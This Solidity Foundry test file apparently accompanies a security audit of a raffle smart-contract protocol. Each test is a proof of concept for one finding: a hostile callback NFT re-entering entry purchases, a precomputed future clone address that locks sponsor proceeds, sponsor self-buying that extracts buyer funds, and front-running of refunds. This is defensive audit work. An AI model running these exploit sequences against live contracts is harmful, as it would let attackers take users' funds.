// SPDX-License-Identifier: Apache-2.0
pragma solidity 0.8.36;

import {Test} from "forge-std/Test.sol";
import {Raffle} from "../../src/Raffle.sol";
import {RaffleFactory} from "../../src/RaffleFactory.sol";
import {IRaffle} from "../../src/interfaces/IRaffle.sol";
import {IRaffleFactory} from "../../src/interfaces/IRaffleFactory.sol";
import {RaffleConstants} from "../../src/libraries/RaffleConstants.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {ERC721} from "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract CallbackPrizeNFT is ERC721 {
    MockUSDC6 public immutable usdc;
    address public callbackBuyer;
    uint128 public callbackEntries;
    bool public boughtDuringSafeTransfer;

    constructor(MockUSDC6 usdc_, address buyer_, uint128 entries_) ERC721("Callback Prize", "CBPRIZE") {
        usdc = usdc_;
        callbackBuyer = buyer_;
        callbackEntries = entries_;
    }

    function mint(address to, uint256 tokenId) external {
        _mint(to, tokenId);
    }

    function safeTransferFrom(address from, address to, uint256 tokenId, bytes memory data) public override {
        _transfer(from, to, tokenId);
        bytes4 retval = IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, data);
        require(retval == IERC721Receiver.onERC721Received.selector, "INVALID_RECEIVER");
        // Immediately after onERC721Received sets Status.Active, before RaffleFactory.createRaffle finishes or emits RaffleCreated:
        usdc.approve(to, uint256(callbackEntries) * RaffleConstants.ENTRY_PRICE);
        Raffle(payable(to)).buyEntries(callbackBuyer, callbackEntries);
        boughtDuringSafeTransfer = true;
    }
}

contract MockUSDC6 is ERC20 {
    constructor() ERC20("Mock USDC", "USDC") {}
    function decimals() public pure override returns (uint8) { return 6; }
    function mint(address to, uint256 amount) external { _mint(to, amount); }
}

contract MockVRFWrapper {
    address public immutable link;
    uint256 public nextRequestId = 1;
    constructor(address link_) { link = link_; }
    function calculateRequestPriceNative(uint32, uint32) external pure returns (uint256) {
        return 0.01 ether;
    }
    function requestRandomWordsInNative(uint32, uint16, uint32, bytes calldata) external payable returns (uint256 requestId) {
        requestId = nextRequestId++;
    }
    function fulfill(address raffle, uint256 requestId, uint256 word) external {
        uint256[] memory words = new uint256[](1);
        words[0] = word;
        Raffle(payable(raffle)).rawFulfillRandomWords(requestId, words);
    }
}

contract PausablePrizeNFT is ERC721 {
    bool public transfersBlocked;
    constructor() ERC721("Prize NFT", "PRIZE") {}
    function mint(address to, uint256 tokenId) external { _mint(to, tokenId); }
    function setTransfersBlocked(bool blocked) external { transfersBlocked = blocked; }
    function _update(address to, uint256 tokenId, address auth) internal override returns (address) {
        address from = _ownerOf(tokenId);
        if (transfersBlocked && from != address(0)) revert("PRIZE_PAUSED");
        return super._update(to, tokenId, auth);
    }
}

contract GeminiAuditPoCTest is Test {
    MockUSDC6 internal usdc;
    MockVRFWrapper internal wrapper;
    PausablePrizeNFT internal nft;
    RaffleFactory internal factory;

    address internal treasury = address(0xBEEF);
    address internal sponsor1 = address(0xA11CE);
    address internal sponsor2 = address(0xB0B);
    address internal buyer1 = address(0xCAFE);

    function setUp() external {
        usdc = new MockUSDC6();
        wrapper = new MockVRFWrapper(address(0x1234));
        nft = new PausablePrizeNFT();
        factory = new RaffleFactory(address(usdc), address(wrapper), treasury);

        nft.mint(sponsor1, 1);
        nft.mint(sponsor2, 2);
        usdc.mint(buyer1, 1_000_000e6);
        usdc.mint(sponsor1, 1_000_000e6);
    }

    /// @notice PoC for FP-M-01: Precomputed future clone CREATE address bypasses _isProtocolDestination,
    /// permanently locking sponsorProceeds in Raffle #1 and transferring Raffle #1's prize NFT into Raffle #2!
    function testPoC_FPM01_FutureCloneCrossClonePrizeTransferAndLockedProceeds() external {
        // Factory nonce 1 deployed raffleImplementation; nonce 2 will deploy Raffle #1; nonce 3 will deploy Raffle #2.
        address predictedRaffle2 = vm.computeCreateAddress(address(factory), 3);
        assertEq(predictedRaffle2.code.length, 0);
        assertFalse(factory.isRaffle(predictedRaffle2));

        // 1. Sponsor1 creates Raffle #1 with sponsorRecipient = predictedRaffle2
        vm.startPrank(sponsor1);
        nft.approve(address(factory), 1);
        address raffle1Addr = factory.createRaffle(
            IRaffleFactory.CreateRaffleParams({
                prizeToken: address(nft),
                prizeTokenId: 1,
                sponsorRecipient: predictedRaffle2,
                reserveEntries: 100,
                endTime: uint64(block.timestamp + 1 days)
            })
        );
        vm.stopPrank();
        Raffle raffle1 = Raffle(payable(raffle1Addr));

        // 2. Buyer1 buys 10 entries in Raffle #1 (below reserveEntries = 100 -> CashWon)
        vm.startPrank(buyer1);
        usdc.approve(address(raffle1), 10 * RaffleConstants.ENTRY_PRICE);
        raffle1.buyEntries(buyer1, 10);
        vm.stopPrank();

        // 3. Sponsor2 creates Raffle #2, which deploys at predictedRaffle2!
        vm.startPrank(sponsor2);
        nft.approve(address(factory), 2);
        address raffle2Addr = factory.createRaffle(
            IRaffleFactory.CreateRaffleParams({
                prizeToken: address(nft),
                prizeTokenId: 2,
                sponsorRecipient: sponsor2,
                reserveEntries: 50,
                endTime: uint64(block.timestamp + 1 days)
            })
        );
        vm.stopPrank();
        assertEq(raffle2Addr, predictedRaffle2);
        assertTrue(factory.isRaffle(predictedRaffle2));

        // 4. Resolve Raffle #1 to Status.CashWon
        vm.warp(block.timestamp + 1 days + 1);
        vm.deal(buyer1, 1 ether);
        vm.prank(buyer1);
        uint256 reqId = raffle1.requestDraw{value: 0.01 ether}();
        wrapper.fulfill(address(raffle1), reqId, 0);
        assertEq(uint8(raffle1.status()), uint8(IRaffle.Status.CashWon));

        raffle1.settleWinningTicket(1);

        // 5. releaseSponsorProceeds() permanently reverts with InvalidQuoteDestination(predictedRaffle2)!
        vm.expectRevert(abi.encodeWithSelector(IRaffle.InvalidQuoteDestination.selector, predictedRaffle2));
        raffle1.releaseSponsorProceeds();

        // 6. releaseSponsorPrize() omits _isProtocolDestination and moves NFT #1 into Raffle #2 (violating DESIGN.md)!
        raffle1.releaseSponsorPrize();
        assertEq(nft.ownerOf(1), raffle2Addr);
    }

    /// @notice PoC for FP-M-02: Decoupled releaseSponsorProceeds in Status.NftWon lets sponsor extract 95% of buyer USDC
    /// even when prizeToken blocks transfer in redeemWinningTicket.
    function testPoC_FPM02_DecoupledSponsorProceedsWhenPrizeTransferBlocked() external {
        vm.startPrank(sponsor1);
        nft.approve(address(factory), 1);
        address raffleAddr = factory.createRaffle(
            IRaffleFactory.CreateRaffleParams({
                prizeToken: address(nft),
                prizeTokenId: 1,
                sponsorRecipient: sponsor1,
                reserveEntries: 10,
                endTime: uint64(block.timestamp + 1 days)
            })
        );
        vm.stopPrank();
        Raffle raffle = Raffle(payable(raffleAddr));

        vm.startPrank(buyer1);
        usdc.approve(address(raffle), 10 * RaffleConstants.ENTRY_PRICE);
        raffle.buyEntries(buyer1, 10);
        vm.stopPrank();

        vm.warp(block.timestamp + 1 days + 1);
        vm.deal(buyer1, 1 ether);
        vm.prank(buyer1);
        uint256 reqId = raffle.requestDraw{value: 0.01 ether}();
        wrapper.fulfill(address(raffle), reqId, 0);
        assertEq(uint8(raffle.status()), uint8(IRaffle.Status.NftWon));

        // Prize token becomes paused / transfer-restricted before winner redeems
        nft.setTransfersBlocked(true);

        // Sponsor settles and extracts 95% of buyer1's USDC!
        uint256 sponsorBalBefore = usdc.balanceOf(sponsor1);
        raffle.settleWinningTicket(1);
        raffle.releaseSponsorProceeds();
        assertEq(usdc.balanceOf(sponsor1) - sponsorBalBefore, 9_500_000);

        // Winner cannot redeem the prize NFT and cannot enable refunds!
        vm.prank(buyer1);
        vm.expectRevert("PRIZE_PAUSED");
        raffle.redeemWinningTicket(1);
    }

    /// @notice PoC for FP-L-01: Sponsor self-purchase across reserveEntries cliff (95% rebate -> $0.05 net cost per entry)
    /// and single-buyer under-target draw fee extraction (20% fee on a 1-ticket raffle).
    function testPoC_FPL01_SponsorSelfPurchaseAndSingleBuyerExtraction() external {
        nft.mint(sponsor1, 10);
        vm.startPrank(sponsor1);
        nft.approve(address(factory), 10);
        address raffleAddr = factory.createRaffle(
            IRaffleFactory.CreateRaffleParams({
                prizeToken: address(nft),
                prizeTokenId: 10,
                sponsorRecipient: sponsor1,
                reserveEntries: 1_000,
                endTime: uint64(block.timestamp + 1 days)
            })
        );
        vm.stopPrank();
        Raffle raffle = Raffle(payable(raffleAddr));

        // Buyer1 buys 500 entries ($500 USDC)
        vm.startPrank(buyer1);
        usdc.approve(address(raffle), 500 * RaffleConstants.ENTRY_PRICE);
        raffle.buyEntries(buyer1, 500);
        vm.stopPrank();

        // Sponsor1 buys 500 entries ($500 USDC) to cross reserveEntries = 1000
        uint256 sponsorStartUsdc = usdc.balanceOf(sponsor1);
        vm.startPrank(sponsor1);
        usdc.approve(address(raffle), 500 * RaffleConstants.ENTRY_PRICE);
        raffle.buyEntries(sponsor1, 500);
        vm.stopPrank();

        // Draw resolves with word = 500 (entry #501 -> Sponsor1's ticket #2 wins!)
        vm.warp(block.timestamp + 1 days + 1);
        vm.deal(sponsor1, 1 ether);
        vm.prank(sponsor1);
        uint256 reqId = raffle.requestDraw{value: 0.01 ether}();
        wrapper.fulfill(address(raffle), reqId, 500);
        assertEq(uint8(raffle.status()), uint8(IRaffle.Status.NftWon));

        raffle.settleWinningTicket(2);
        raffle.releaseSponsorProceeds();
        vm.prank(sponsor1);
        raffle.redeemWinningTicket(2);

        // Sponsor1 spent 500 USDC, received 950 USDC back (net +450 USDC from Buyer1) AND kept the NFT!
        assertEq(usdc.balanceOf(sponsor1) - sponsorStartUsdc, 450_000_000);
        assertEq(nft.ownerOf(10), sponsor1);
    }

    /// @notice PoC for FP-L-02: Front-running empty-raffle cancellation (enableRefunds) with a 1-USDC buyEntries call.
    function testPoC_FPL02_FrontrunEmptyRaffleCancelWith1USDC() external {
        nft.mint(sponsor1, 11);
        vm.startPrank(sponsor1);
        nft.approve(address(factory), 11);
        address raffleAddr = factory.createRaffle(
            IRaffleFactory.CreateRaffleParams({
                prizeToken: address(nft),
                prizeTokenId: 11,
                sponsorRecipient: sponsor1,
                reserveEntries: 100,
                endTime: uint64(block.timestamp + 30 days)
            })
        );
        vm.stopPrank();
        Raffle raffle = Raffle(payable(raffleAddr));

        // Buyer1 front-runs sponsor1's enableRefunds() with a 1-USDC purchase
        vm.startPrank(buyer1);
        usdc.approve(address(raffle), 1 * RaffleConstants.ENTRY_PRICE);
        raffle.buyEntries(buyer1, 1);
        vm.stopPrank();

        // Sponsor1's enableRefunds() call now reverts with RefundsNotAvailable(endTime + DRAW_REQUEST_TIMEOUT, block.timestamp)
        vm.prank(sponsor1);
        vm.expectRevert(
            abi.encodeWithSelector(
                IRaffle.RefundsNotAvailable.selector,
                raffle.endTime() + RaffleConstants.DRAW_REQUEST_TIMEOUT,
                uint64(block.timestamp)
            )
        );
        raffle.enableRefunds();
    }

    /// @notice PoC for FP-L-03: Untrusted prizeToken executes buyEntries during safeTransferFrom before RaffleCreated is emitted.
    function testPoC_FPL03_MidEscrowBuyEntriesBeforeRaffleCreated() external {
        CallbackPrizeNFT cbNft = new CallbackPrizeNFT(usdc, buyer1, 5);
        cbNft.mint(sponsor1, 1);
        usdc.mint(address(cbNft), 100e6);

        vm.startPrank(sponsor1);
        cbNft.approve(address(factory), 1);
        address raffleAddr = factory.createRaffle(
            IRaffleFactory.CreateRaffleParams({
                prizeToken: address(cbNft),
                prizeTokenId: 1,
                sponsorRecipient: sponsor1,
                reserveEntries: 10,
                endTime: uint64(block.timestamp + 1 days)
            })
        );
        vm.stopPrank();

        Raffle raffle = Raffle(payable(raffleAddr));
        assertTrue(cbNft.boughtDuringSafeTransfer());
        assertEq(raffle.totalEntries(), 5);
        assertEq(raffle.ownerOf(1), buyer1);
    }
}
